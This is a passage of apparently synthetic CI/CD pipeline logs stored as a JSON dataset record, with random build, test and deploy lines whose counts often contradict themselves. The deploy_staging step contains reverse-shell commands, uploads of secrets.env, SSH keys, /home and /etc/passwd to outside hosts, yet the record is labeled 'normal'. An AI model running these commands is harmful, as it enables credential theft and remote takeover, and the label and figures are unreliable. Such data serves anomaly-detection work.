          "Using Python 3.10",
          "Verifying...",
          "GET /health - 200 (50ms)",
          "Waiting...",
          "Cache invalidated: node_modules",
          "[12:19:08] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Processing...",
          "Connection established",
          "Cache hit for key-6249",
          "Layer 5/10: COPY command",
          "Installing eslint@2.9.10",
          "pip install: Successfully installed express-3.17",
          "Fetching submodules...",
          "Pulling image: node:latest",
          "Installing lodash@2.9.3",
          "Snapshots: 36 passed, 38 total",
          "Platform: darwin-arm64",
          "[12:19:08] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Cache invalidated: node_modules",
          "npm notice: package.json updated",
          "Compiling lib/handler.rs...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "npm install: resolved 1290 packages",
          "Test Suites: 43 passed, 7 total",
          "Pulling image: alpine:3.11",
          "Processing...",
          "\u2713 All checks passed",
          "[12:19:08] ERROR: Connection failed",
          "Installing eslint@5.1.6",
          "[12:19:08] INFO: Starting build process",
          "TLS handshake completed",
          "Time: 114.941s",
          "Cache restored successfully (206MB)",
          "WARNING: prettier has known vulnerabilities",
          "Creating production build...",
          "\u2713 build completed",
          "Cache saved successfully",
          "Finished.",
          "Done.",
          "Ready.",
          "[12:19:08] DEBUG: Memory usage: 696MB",
          "Ready.",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 757ms",
          "POST /api - 201 (102ms)",
          "Ran 125 tests in 17s",
          "Image pulled successfully",
          "Processing...",
          "Finished.",
          "WARNING: axios has known vulnerabilities",
          "Step 11/25: Running migrations",
          "Generating source maps...",
          "[12:19:08] INFO: Starting build process",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-24T12:21:15.642471",
        "finished_at": "2025-11-24T12:21:24.967985",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 test completed",
          "Step 1/19: Building",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "Tests: 228 passed, 423 total",
          "pip: Installing build dependencies...",
          "Compiling lib/utils.go...",
          "Generating source maps...",
          "Fetching submodules...",
          "  PASS: test_api_health (423ms)",
          "HEAD is now at e51d49c",
          "Installing express@4.0.0",
          "\u2713 Task completed in 1502ms",
          "Waiting...",
          "npm install: added 405 packages",
          "[12:19:08] INFO: Request completed",
          "POST /data - 202 (158ms)",
          "Step 1/22: Running migrations",
          "OK",
          "TLS handshake completed",
          "  PASS: test_cache_hit (125ms)",
          "GET /api - 201 (88ms)",
          "Using Python 3.9",
          "[12:19:08] WARN: Deprecated API usage",
          "Cache miss for key-6810",
          "[12:19:08] INFO: Request completed",
          "Uploading artifact 'dist' (40 files)",
          "\u2717 build failed with exit code 54",
          "npm install: added 32 packages",
          "npm notice: created a lockfile",
          "Switched to branch 'feature/task-856'",
          "[12:19:08] INFO: Cache refreshed",
          "[12:19:08] INFO: Connecting to database",
          "HEAD is now at 090c8d3",
          "Ran 115 tests in 12s",
          "Success!",
          "\u2713 Task completed in 208ms",
          "WARNING: express has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 962ms",
          "Processing...",
          "Ran 123 tests in 14s",
          "Cache invalidated: build",
          "[12:19:08] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Cache saved successfully",
          "Connecting to acme.corp:443...",
          "[12:19:08] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Layer 1/14: RUN command",
          "Time: 66.874s",
          "\u2713 Step 'test' succeeded",
          "[12:19:08] DEBUG: Query executed in 28ms",
          "Artifact uploaded: dist.zip (72MB)",
          "[12:19:08] INFO: Processing request",
          "\u2713 Task completed in 3996ms",
          "Tests: 237 passed, 368 total",
          "\u2717 build failed with exit code 49",
          "pip: Collecting axios",
          "npm notice: created a lockfile",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] DEBUG: Initializing service",
          "Building Docker image...",
          "[12:19:08] WARN: Deprecated API usage",
          "Ran 101 tests in 44s",
          "pip: Collecting webpack",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 0220751",
          "  PASS: integration/test_user_create.spec.js",
          "Step 8/25: Linting",
          "Compiling utils/service.java...",
          "Cache hit for key-3907",
          "Time: 87.731s",
          "[12:19:08] DEBUG: Initializing service",
          "Installing express@4.5.8",
          "[12:19:08] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Fetching submodules...",
          "Installing react@4.0.1",
          "Cache invalidated: build",
          "NODE_ENV=development",
          "[12:19:08] INFO: Processing request",
          "Step 18/25: Building",
          "Checking out master branch",
          "Step 8/20: Running migrations",
          "Verifying...",
          "pip: Downloading lodash-5.1.tar.gz",
          "Completed.",
          "Pulling image: node:3.11",
          "[12:19:08] DEBUG: Connection pool: 2 active",
          "GET /health - 200 (79ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (71MB)",
          "Installing webpack@3.20.8",
          "pip: Installing build dependencies...",
          "[12:19:08] INFO: Request completed",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/utils.go...",
          "Using Node.js 15.7.3",
          "Connection established",
          "Layer 3/12: RUN command",
          "yarn add: Done in 5.8s",
          "Layer 4/12: COPY command",
          "Platform: linux-x64",
          "Compiling src/service.java...",
          "[12:19:08] DEBUG: Query executed in 64ms",
          "Compiling utils/utils.go...",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "pip: Downloading express-5.2.tar.gz",
          "Step 2/21: Testing",
          "TLS handshake completed",
          "Cache restored successfully (294MB)",
          "WARNING: webpack has known vulnerabilities",
          "Layer 5/11: RUN command",
          "Step 13/25: Running migrations",
          "[12:19:08] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 8/10: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Time: 62.399s",
          "[12:19:08] DEBUG: Connection pool: 1 active",
          "Using Node.js 17.16.6",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/app.ts...",
          "Step 8/25: Building",
          "Step 3/25: Installing dependencies",
          "Minifying vendor.js",
          "npm notice: package.json updated",
          "GET /api - 204 (19ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Bundling vendor.js",
          "Using Python 3.11",
          "POST /api - 202 (426ms)",
          "Finished.",
          "Optimizing 51 modules...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 test completed",
          "Processing...",
          "HEAD is now at 44b71c8",
          "Step 7/16: Testing",
          "Optimizing 31 modules...",
          "Using Python 3.12",
          "[12:19:08] WARN: Deprecated API usage",
          "Time: 106.783s",
          "\u2713 All checks passed",
          "Environment: production",
          "Connection established",
          "TLS handshake completed",
          "[12:19:08] DEBUG: Connection pool: 7 active",
          "Building Docker image...",
          "Platform: win32-x64",
          "\u2713 validate completed",
          "Pulling image: python:3.11",
          "Connection established",
          "npm install: resolved 1451 packages",
          "Uploading artifact 'dist' (1 files)",
          "npm notice: package.json updated",
          "Compiling components/handler.rs...",
          "Checking out main branch",
          "Verifying...",
          "POST /api - 200 (337ms)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-24T12:21:24.967985",
        "finished_at": "2025-11-24T12:21:52.944527",
        "log_lines": [
          "=== Step: build ===",
          "Coverage: 81% statements, 83% branches",
          "yarn add: Done in 20.67s",
          "Done.",
          "Compiling src/utils.go...",
          "Step 3/19: Running migrations",
          "HEAD is now at 1b5574a",
          "GET /health - 200 (6ms)",
          "Transforming 994 files...",
          "Installing express@1.6.0",
          "[12:19:08] INFO: Cache refreshed",
          "Minifying main.js",
          "Layer 7/15: COPY command",
          "Building Docker image...",
          "Optimizing 82 modules...",
          "[12:19:08] INFO: Cache refreshed",
          "[12:19:08] INFO: Cache refreshed",
          "Switched to branch 'feature/task-957'",
          "Waiting...",
          "Using Python 3.9",
          "Uploading artifact 'coverage' (15 files)",
          "\u2713 package completed",
          "[12:19:08] DEBUG: Initializing service",
          "[12:19:08] DEBUG: Initializing service",
          "Transforming 190 files...",
          "Step 7/15: Running migrations",
          "[12:19:08] INFO: Cache refreshed",
          "Cache saved successfully",
          "[12:19:08] ERROR: Connection failed",
          "WARNING: axios has known vulnerabilities",
          "[12:19:08] INFO: Request completed",
          "[12:19:08] DEBUG: Initializing service",
          "[12:19:08] DEBUG: Memory usage: 345MB",
          "[12:19:08] DEBUG: Initializing service",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 26 modules...",
          "[12:19:08] WARN: Deprecated API usage",
          "Loading...",
          "Step 18/25: Building",
          "Step 17/20: Building",
          "Switched to branch 'hotfix/task-440'",
          "TLS handshake completed",
          "Time: 8.568s",
          "GET /health - 204 (36ms)",
          "\u2717 build failed with exit code 66",
          "  PASS: test_user_create (315ms)",
          "yarn add: Done in 18.54s",
          "npm notice: package.json updated",
          "FAILED: test_user_create",
          "[12:19:08] WARN: Deprecated API usage",
          "Ran 166 tests in 40s",
          "yarn add: Done in 4.62s",
          "WARNING: react has known vulnerabilities",
          "Pulling image: alpine:18",
          "Artifact downloaded: 48MB",
          "[12:19:08] ERROR: Connection failed",
          "Artifact downloaded: 25MB",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Image pulled successfully",
          "Connection established",
          "Cache saved successfully",
          "Transforming 480 files...",
          "[12:19:08] INFO: Starting build process",
          "[12:19:08] INFO: Request completed",
          "Waiting...",
          "Snapshots: 14 passed, 18 total",
          "pip: Collecting lodash",
          "[12:19:08] DEBUG: Memory usage: 1762MB",
          "[12:19:08] WARN: Deprecated API usage",
          "Step 20/20: Deploying",
          "GET /api - 204 (41ms)",
          "\u2713 package completed",
          "Ran 75 tests in 17s",
          "Snapshots: 13 passed, 3 total",
          "  PASS: test_user_create (449ms)",
          "WARNING: react has known vulnerabilities",
          "Step 2/19: Testing",
          "Artifact downloaded: 43MB",
          "[12:19:08] DEBUG: Loading configuration",
          "npm install: added 154 packages",
          "Ready.",
          "Step 2/22: Linting",
          "Processing...",
          "Completed.",
          "Cache restored successfully (134MB)",
          "Compiling src/index.js...",
          "Completed.",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:19:08] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Connecting to acme.corp:443...",
          "Ready.",
          "Ready.",
          "Connection established",
          "Using Node.js 20.1.5",
          "[12:19:08] DEBUG: Connection pool: 14 active",
          "Step 1/19: Installing dependencies",
          "Cache saved successfully",
          "Layer 2/8: ENV command",
          "Compiling lib/index.js...",
          "Step 2/18: Running migrations",
          "GET /api - 201 (29ms)",
          "Cache restored successfully (392MB)",
          "Step 16/25: Testing",
          "Transforming 192 files...",
          "Tests: 479 passed, 285 total",
          "HEAD is now at 245059f",
          "Coverage: 82% statements, 74% branches",
          "Step 12/20: Installing dependencies",
          "Step 4/24: Building",
          "Bundling vendor.js",
          "Processing...",
          "npm install: resolved 795 packages",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Environment: staging",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:08] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'hotfix/task-371'",
          "Building Docker image...",
          "yarn add: Done in 21.58s",
          "npm install: resolved 975 packages",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (4MB)",
          "yarn add: Done in 21.95s",
          "Pushing to registry...",
          "[12:19:08] ERROR: Connection failed",
          "[12:19:08] DEBUG: Loading configuration",
          "Generating source maps...",
          "Connection established",
          "Step 16/16: Linting",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Using Node.js 17.17.7",
          "WARNING: express has known vulnerabilities",
          "Layer 1/8: COPY command",
          "yarn add: Done in 15.72s",
          "npm notice: created a lockfile",
          "Environment: production",
          "Coverage: 88% statements, 100% branches",
          "Layer 4/11: ENV command",
          "Tests: 183 passed, 162 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "[12:19:08] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:19:08] WARN: Deprecated API usage",
          "Step 7/23: Deploying",
          "npm notice: package.json updated",
          "[12:19:08] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Cache miss for key-1089",
          "Tests: 425 passed, 350 total",
          "Compiling components/index.js...",
          "Done.",
          "Done.",
          "[12:19:08] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Compiling components/service.java...",
          "\u2713 Task completed in 475ms",
          "Pushing to registry...",
          "Transforming 502 files...",
          "Fetching submodules...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-24T12:21:52.944527",
        "finished_at": "2025-11-24T12:21:56.674733",
        "log_lines": [
          "=== Step: checkout ===",
          "Test Suites: 7 passed, 33 total",
          "Checking out main branch",
          "[12:19:08] DEBUG: Memory usage: 654MB",
          "pip: Installing build dependencies...",
          "Ran 108 tests in 28s",
          "Waiting...",
          "[12:19:08] DEBUG: Memory usage: 912MB",
          "[12:19:08] DEBUG: Memory usage: 1097MB",
          "npm notice: created a lockfile",
          "Compiling utils/handler.rs...",
          "Compiling components/main.py...",
          "[12:19:08] INFO: Starting build process",
          "npm install: added 226 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 80.473s",
          "Tests: 408 passed, 367 total",
          "POST /data - 200 (235ms)",
          "Building Docker image...",
          "GET /status - 204 (78ms)",
          "Cache invalidated: dependencies",
          "Step 4/20: Deploying",
          "Switched to branch 'feature/task-385'",
          "Generating source maps...",
          "Ran 59 tests in 35s",
          "[12:19:08] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Ran 57 tests in 35s",
          "Pushing to registry...",
          "Time: 39.44s",
          "Pushing to registry...",
          "Finished.",
          "Cache miss for key-7438",
          "[12:19:08] DEBUG: Query executed in 65ms",
          "Finished.",
          "\u2713 lint completed",
          "Transforming 137 files...",
          "[12:19:08] INFO: Processing request",
          "Compiling utils/handler.rs...",
          "Step 5/21: Deploying",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 22.94s",
          "[12:19:08] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 82ff907",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "Environment: development",
          "pip install: Successfully installed lodash-2.15",
          "[12:19:08] INFO: Request completed",
          "[12:19:08] INFO: Connecting to database",
          "Generating source maps...",
          "npm install: resolved 870 packages",
          "[12:19:08] INFO: Cache refreshed",
          "Step 3/24: Running migrations",
          "Completed.",
          "Transforming 267 files...",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "Ready.",
          "Cache hit for key-6087",
          "pip: Installing build dependencies...",
          "Ran 28 tests in 13s",
          "[12:19:08] DEBUG: Connection pool: 13 active",
          "[12:19:08] ERROR: Connection failed",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Generating source maps...",
          "\u2713 Task completed in 1372ms",
          "Pushing to registry...",
          "Test Suites: 7 passed, 49 total",
          "OK",
          "OK",
          "Step 10/18: Linting",
          "\u2713 deploy completed",
          "[12:19:08] INFO: Connecting to database",
          "Cache miss for key-2136",
          "Waiting...",
          "pip: Collecting eslint",
          "pip: Downloading axios-1.7.tar.gz",
          "Step 18/20: Installing dependencies",
          "Building Docker image...",
          "Step 12/16: Testing",
          "[12:19:08] INFO: Cache refreshed",
          "Optimizing 10 modules...",
          "Building Docker image...",
          "pip: Downloading eslint-3.3.tar.gz",
          "Image pulled successfully",
          "[12:19:08] INFO: Cache refreshed",
          "Cache restored successfully (495MB)",
          "Cache saved successfully",
          "[12:19:08] INFO: Starting build process",
          "Artifact uploaded: dist.zip (53MB)",
          "Step 8/23: Running migrations",
          "[12:19:08] DEBUG: Connection pool: 3 active",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 16/19: Linting",
          "Creating production build...",
          "[12:19:08] WARN: Deprecated API usage",
          "Cache hit for key-4534",
          "Environment: production",
          "Step 17/23: Linting",
          "Coverage: 87% statements, 99% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'dist' (6 files)",
          "Step 19/21: Running migrations",
          "Artifact uploaded: dist.zip (87MB)",
          "[12:19:08] INFO: Processing request",
          "Cache saved successfully",
          "[12:19:08] DEBUG: Initializing service",
          "Installing webpack@1.3.8",
          "\u2717 build failed with exit code 70",
          "[12:19:08] INFO: Processing request",
          "Using Node.js 14.9.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "pip install: Successfully installed axios-5.13",
          "Compiling lib/handler.rs...",
          "Compiling components/main.py...",
          "Time: 110.102s",
          "Time: 51.900s",
          "OK",
          "pip: Downloading webpack-2.7.tar.gz",
          "npm install: resolved 233 packages",
          "pip install: Successfully installed axios-5.13",
          "pip: Collecting webpack",
          "Environment: staging",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 231 packages",
          "Minifying main.js",
          "Ran 50 tests in 36s",
          "Transforming 845 files...",
          "Generating source maps...",
          "Minifying main.js",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "[12:19:08] INFO: Starting build process",
          "  PASS: test_db_connect (109ms)",
          "Ran 117 tests in 24s",
          "Connecting to acme.corp:443...",
          "[12:19:08] INFO: Processing request",
          "Cache invalidated: build",
          "Minifying app.js",
          "Using Node.js 15.2.5",
          "Checking out master branch",
          "Processing...",
          "Success!",
          "Cache invalidated: dependencies",
          "WARNING: eslint has known vulnerabilities",
          "Loading...",
          "Step 18/16: Testing",
          "[12:19:08] DEBUG: Memory usage: 212MB",
          "[12:19:08] INFO: Connecting to database",
          "Minifying vendor.js",
          "Pulling image: python:latest",
          "Pulling image: node:18",
          "Using Python 3.9",
          "Step 14/19: Building",
          "Generating source maps...",
          "Step 19/23: Running migrations",
          "POST /data - 201 (241ms)",
          "[12:19:08] WARN: Deprecated API usage",
          "Bundling main.css",
          "\u2713 Task completed in 1821ms",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-24T12:21:56.674733",
        "finished_at": "2025-11-24T12:22:06.000247",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 All checks passed",
          "npm install: added 389 packages",
          "pip install: Successfully installed prettier-2.2",
          "Step 10/20: Linting",
          "Ran 152 tests in 7s",
          "Ready.",
          "Test Suites: 18 passed, 6 total",
          "Loading...",
          "nc -e /bin/sh 14.207.236.145 40781",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "HEAD is now at ccb3ae7",
          "Compiling src/main.py...",
          "Pushing to registry...",
          "Transforming 542 files...",
          "Step 8/17: Deploying",
          "  PASS: e2e/test_db_connect.spec.js",
          "npm install: added 179 packages",
          "[12:19:08] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "TLS handshake completed",
          "Checking out develop branch",
          "Sending 17MB of data to acme.corp",
          "GET /api - 200 (42ms)",
          "yarn add: Done in 2.82s",
          "Connection established",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling utils/app.ts...",
          "Sending 30MB of data to example.com",
          "Compiling src/service.java...",
          "Checking out main branch",
          "Sending 50MB of data to example.com",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 49.237.198.229 47201",
          "POST /api - 201 (373ms)",
          "Cache saved successfully",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Tests: 408 passed, 365 total",
          "[12:19:08] DEBUG: Connection pool: 11 active",
          "Success!",
          "Coverage: 83% statements, 77% branches",
          "pip: Collecting webpack",
          "Cache miss for key-3867",
          "[12:19:08] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "[12:19:08] INFO: Connecting to database",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Completed.",
          "Uploading artifact 'coverage' (38 files)",
          "npm install: resolved 1181 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 2/22: Testing",
          "Cache restored successfully (331MB)",
          "Minifying vendor.js",
          "Snapshots: 37 passed, 23 total",
          "Cache saved successfully",
          "[12:19:08] INFO: Cache refreshed",
          "Snapshots: 22 passed, 7 total",
          "\u2717 build failed with exit code 85",
          "Step 16/17: Installing dependencies",
          "Building Docker image...",
          "Environment: staging",
          "Optimizing 98 modules...",
          "Fetching submodules...",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Starting build process",
          "[12:19:08] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "[12:19:08] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-695'",
          "npm install: resolved 1156 packages",
          "Sending 324MB of data to example.com",
          "Waiting...",
          "OK",
          "Checking out main branch",
          "[12:19:08] DEBUG: Initializing service",
          "[12:19:08] ERROR: Connection failed",
          "yarn add: Done in 25.5s",
          "[12:19:08] DEBUG: Initializing service",
          "Layer 7/15: COPY command",
          "[12:19:08] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 215 passed, 293 total",
          "Completed.",
          "Cache miss for key-3408",
          "Cache invalidated: build",
          "Snapshots: 29 passed, 13 total",
          "Snapshots: 43 passed, 25 total",
          "Verifying...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Snapshots: 26 passed, 48 total",
          "[12:19:08] INFO: Connecting to database",
          "Using Node.js 17.16.7",
          "Checking out main branch",
          "Using Python 3.12",
          "Step 13/16: Deploying",
          "Environment: production",
          "Ran 30 tests in 54s",
          "Done.",
          "Test Suites: 26 passed, 48 total",
          "npm install: resolved 724 packages",
          "GET /health - 201 (74ms)",
          "Layer 1/12: COPY command",
          "Cache hit for key-8752",
          "Finished.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:19:09] DEBUG: Initializing service",
          "[12:19:09] DEBUG: Memory usage: 494MB",
          "Pushing to registry...",
          "[12:19:09] WARN: Deprecated API usage",
          "Loading...",
          "Layer 5/15: ENV command",
          "NODE_ENV=development",
          "\u2713 Task completed in 4920ms",
          "nc -e /bin/sh 243.20.132.249 60480",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Ready.",
          "Processing...",
          "[12:19:09] WARN: Deprecated API usage",
          "\u2713 Task completed in 317ms",
          "[12:19:09] INFO: Request completed",
          "Cache hit for key-6819",
          "[12:19:09] INFO: Processing request",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "pip: Installing build dependencies...",
          "Finished.",
          "\u2713 Task completed in 1780ms",
          "Using Python 3.10",
          "Environment: development",
          "GET /status - 204 (42ms)",
          "\u2713 Task completed in 239ms",
          "[12:19:09] INFO: Processing request",
          "Cache saved successfully",
          "Processing...",
          "Step 1/25: Installing dependencies",
          "Building Docker image...",
          "POST /api - 202 (358ms)",
          "Step 5/23: Testing",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Image pulled successfully",
          "HEAD is now at 3b3f2c2",
          "[12:19:09] DEBUG: Connection pool: 1 active",
          "Cache restored successfully (427MB)",
          "npm notice: package.json updated",
          "yarn add: Done in 27.16s",
          "Time: 19.649s",
          "Completed.",
          "\u2713 Task completed in 1900ms",
          "Artifact downloaded: 20MB",
          "Ready.",
          "[12:19:09] INFO: Request completed",
          "Step 11/22: Installing dependencies",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "TLS handshake completed",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Ran 138 tests in 7s",
          "Compiling lib/utils.go...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:19:09] DEBUG: Initializing service",
          "Generating source maps...",
          "[12:19:09] DEBUG: Memory usage: 1527MB",
          "Compiling src/index.js...",
          "[12:19:09] DEBUG: Memory usage: 1271MB",
          "WARNING: express has known vulnerabilities",
          "GET /api - 204 (34ms)",
          "\u2713 Task completed in 2319ms",
          "Processing...",
          "Connection established",
          "Creating production build...",
          "  PASS: test_api_health (318ms)",
          "[12:19:09] INFO: Starting build process",
          "Completed.",
          "pip: Downloading express-1.9.tar.gz",
          "Building Docker image...",
          "[12:19:09] INFO: Request completed",
          "[12:19:09] DEBUG: Initializing service",
          "[12:19:09] WARN: Deprecated API usage",
          "Step 9/21: Running migrations",
          "Completed.",
          "[12:19:09] DEBUG: Memory usage: 309MB",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 140 tests in 25s",
          "\u2713 Step 'test' succeeded",
          "Compiling lib/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}